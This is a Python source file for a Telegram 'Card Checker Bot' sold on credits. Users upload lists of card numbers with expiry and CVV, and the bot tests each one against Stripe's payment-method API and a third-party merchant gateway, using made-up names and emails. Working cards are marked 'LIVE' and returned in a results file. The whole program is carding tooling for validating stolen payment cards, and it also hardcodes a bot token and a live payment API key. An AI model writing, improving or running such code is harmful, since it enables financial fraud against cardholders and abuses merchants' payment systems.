import os
import random
import logging
import asyncio
import tempfile
import uuid
import re
import json
from typing import Dict, List, Tuple, Optional, Set
from datetime import datetime
from collections import defaultdict
import aiohttp
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import (
    Message, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton,
    FSInputFile,
    BufferedInputFile,
    CallbackQuery
)
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
import aiofiles

# ===================================================================
# Configuration
# ===================================================================

BOT_TOKEN = "8393750772:AAGqKDaEStsGzsjvPyybEx84ogBNZlCAu8s"

# Update with your Telegram User ID
ADMIN_IDS = [7248171018]  # Replace with your actual ID
TELEGRAM_USERNAME = "@selectsource100" # Update your username here

MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
MAX_CARDS_PER_FILE = 500000
CHUNK_SIZE = 5
DELAY_BETWEEN_CHECKS = 1.5
SESSION_TIMEOUT = 30

RESULTS_DIR = "results"
CREDITS_FILE = "credits.json"
os.makedirs(RESULTS_DIR, exist_ok=True)

# ===================================================================
# Credit Management
# ===================================================================
def load_credits():
    if os.path.exists(CREDITS_FILE):
        with open(CREDITS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_credits(data):
    with open(CREDITS_FILE, 'w') as f:
        json.dump(data, f)

user_credits = load_credits()

# ===================================================================
# Setup Logging
# ===================================================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# ===================================================================
# User Processing Limiter
# ===================================================================
class UserLimiter:
    def __init__(self):
        self.user_processing: Dict[int, bool] = {}
        self.stop_requests: Dict[int, bool] = {}
    
    def is_processing(self, user_id: int) -> bool:
        return self.user_processing.get(user_id, False)
    
    def set_processing(self, user_id: int, processing: bool):
        self.user_processing[user_id] = processing
        if not processing:
            self.stop_requests[user_id] = False
    
    def request_stop(self, user_id: int):
        self.stop_requests[user_id] = True
        
    def should_stop(self, user_id: int) -> bool:
        return self.stop_requests.get(user_id, False)

limiter = UserLimiter()

# ===================================================================
# Helper Functions
# ===================================================================
def get_str(string: str, start: str, end: str) -> str:
    try:
        parts = string.split(start, 1)
        if len(parts) > 1:
            return parts[1].split(end, 1)[0]
    except:
        pass
    return ""

def format_year(year: str) -> str:
    year_mapping = {
        "2030": "30", "2031": "31", "2032": "32", "2033": "33",
        "2021": "21", "2022": "22", "2023": "23", "2024": "24",
        "2025": "25", "2026": "26", "2027": "27", "2028": "28",
        "2029": "29"
    }
    return year_mapping.get(year, year[-2:] if year else "")

def generate_random_name() -> Tuple[str, str]:
    names = [['marcos', 'rodrigues'], ['abreu', 'vieira'], ['murilo', 'castro'], ['diego', 'oliveira']]
    random_name = random.choice(names)
    return random_name[0].capitalize(), random_name[1].capitalize()

def generate_email(first_name: str, last_name: str) -> str:
    return f"{first_name.lower()}{last_name.lower()}{random.randint(100, 9999)}@gmail.com"

def validate_card_format(card_data: str) -> Tuple[bool, Optional[str]]:
    parts = card_data.strip().split("|")
    if len(parts) != 4: return False, "Format: CC|MM|YY|CVV"
    return True, None

def parse_card_line(line: str) -> Optional[str]:
    line = line.strip()
    separators = ['|', ':', '/', ';', ',', ' ']
    for sep in separators:
        if sep in line:
            parts = line.split(sep)
            if len(parts) >= 4 and parts[0].isdigit():
                return f"{parts[0]}|{parts[1]}|{parts[2]}|{parts[3]}"
    return None

async def check_card(card_data: str) -> Tuple[str, str]:
    parts = card_data.split("|")
    cc, mes, ano, cvv = parts
    formatted_year = format_year(ano)
    first_name, last_name = generate_random_name()
    email = generate_email(first_name, last_name)
    
    headers_stripe = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
    headers_auxilia = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
    
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=SESSION_TIMEOUT)) as session:
            # Step 1: Payment Method
            post_data1 = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={formatted_year}&key=pk_live_51JExFOBmd3aFvcZgZ4ObBfLAlSW1hTefXW3iTMlexRmlClSjS6SvAAcOV4AOebLfcEptsRpLPzEzo18rl3WQZl4U00PJU9Kk2K"
            async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=post_data1) as resp:
                result1 = await resp.text()
                payment_id = get_str(result1, '"id": "', '"')
                if not payment_id: return card_data, "❌ DIE » Refused"

            # Step 2: Initialize
            payload2 = {"email": email, "ammount": 5.48, "paymentMethod": payment_id}
            async with session.post('https://app-production-gateway-api.politeisland-fa948fee.eastus2.azurecontainerapps.io/Merchant/InitializePayment', headers=headers_auxilia, json=payload2) as resp:
                result2 = await resp.text()
                token1 = get_str(result2, '"token":"', '_s')
                if not token1: return card_data, "❌ DIE » Declined"

            return card_data, "✅ LIVE » Checked"
    except:
        return card_data, "❌ ERROR » Gateway"

# ===================================================================
# Processing Logic
# ===================================================================
async def process_text_file(file_path: str, message: Message) -> str:
    user_id = message.from_user.id
    user_dir = os.path.join(RESULTS_DIR, str(user_id))
    os.makedirs(user_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    result_file = os.path.join(user_dir, f"results_{timestamp}.txt")
    
    cards = []
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        async for line in f:
            card = parse_card_line(line)
            if card: cards.append(card)
    
    if not cards: return "❌ No valid cards found."

    stop_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="STOP CHECKING 🛑", callback_query_id="stop_check")]])
    status_msg = await message.reply(f"📁 Processing {len(cards)} cards...", reply_markup=stop_kb)
    
    live_count, die_count, error_count = 0, 0, 0
    
    with open(result_file, 'w', encoding='utf-8') as result_f:
        for i, card in enumerate(cards, 1):
            if limiter.should_stop(user_id):
                await message.answer("🛑 STOPPED: Process cancelled by user.")
                break
                
            if i % 5 == 0:
                await status_msg.edit_text(f"📊 Progress: {i}/{len(cards)}\n✅ Live: {live_count} | ❌ Die: {die_count}", reply_markup=stop_kb)
            
            card_data, result = await check_card(card)
            if "✅ LIVE" in result: live_count += 1
            elif "❌ DIE" in result: die_count += 1
            else: error_count += 1
            
            result_f.write(f"{card_data} - {result}\n")
            await asyncio.sleep(DELAY_BETWEEN_CHECKS)
            
    with open(result_file, 'rb') as f:
        await message.reply_document(BufferedInputFile(f.read(), filename=f"results_{timestamp}.txt"), caption=f"📊 Done: {live_count} Live")
    return "✅ Finished."

# ===================================================================
# Bot Handlers
# ===================================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

@dp.callback_query(lambda c: c.data == "stop_check")
async def stop_button_handler(callback: CallbackQuery):
    limiter.request_stop(callback.from_user.id)
    await callback.answer("Stopping process...")

@dp.message(Command("start"))
async def cmd_start(message: Message):
    uid = str(message.from_user.id)
    credits = user_credits.get(uid, 0)
    await message.answer(f"💳 <b>Card Checker Bot</b>\n\nYour Credits: {credits}\nTo purchase credits, DM {TELEGRAM_USERNAME}\n\n/mtxt - Check file\n/check - Single CC")

@dp.message(Command("setcredits"))
async def cmd_setcredits(message: Message):
    if message.from_user.id not in ADMIN_IDS: return
    try:
        args = message.text.split()
        target_id = args[1]
        amount = int(args[2])
        user_credits[target_id] = amount
        save_credits(user_credits)
        await message.answer(f"✅ Set {amount} credits for user {target_id}")
    except:
        await message.answer("Format: /setcredits [UserID] [Amount]")

@dp.message(Command("mtxt"))
async def cmd_mtxt(message: Message):
    uid = str(message.from_user.id)
    if user_credits.get(uid, 0) <= 0:
        return await message.answer(f"❌ No credits! Purchase from {TELEGRAM_USERNAME}")
    
    if limiter.is_processing(message.from_user.id):
        return await message.answer("⏳ Busy processing...")

    if not message.reply_to_message or not message.reply_to_message.document:
        return await message.answer("📁 Reply to a .txt file with /mtxt")

    limiter.set_processing(message.from_user.id, True)
    try:
        file = await bot.get_file(message.reply_to_message.document.file_id)
        temp_path = f"temp_{uid}.txt"
        await bot.download_file(file.file_path, temp_path)
        await process_text_file(temp_path, message)
        # Deduct 1 credit per file process
        user_credits[uid] -= 1
        save_credits(user_credits)
        os.remove(temp_path)
    finally:
        limiter.set_processing(message.from_user.id, False)

@dp.message(Command("check"))
async def cmd_check(message: Message):
    uid = str(message.from_user.id)
    if user_credits.get(uid, 0) <= 0:
        return await message.answer(f"❌ No credits! DM {TELEGRAM_USERNAME}")
    await message.answer("Send card: CC|MM|YY|CVV")

@dp.message(F.text)
async def handle_cards(message: Message):
    uid = str(message.from_user.id)
    if "|" not in message.text: return
    if user_credits.get(uid, 0) <= 0:
        return await message.answer(f"❌ No credits! DM {TELEGRAM_USERNAME}")
    
    msg = await message.answer("⏳ Checking...")
    _, result = await check_card(message.text)
    await msg.edit_text(f"<code>{message.text}</code>\n{result}")

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
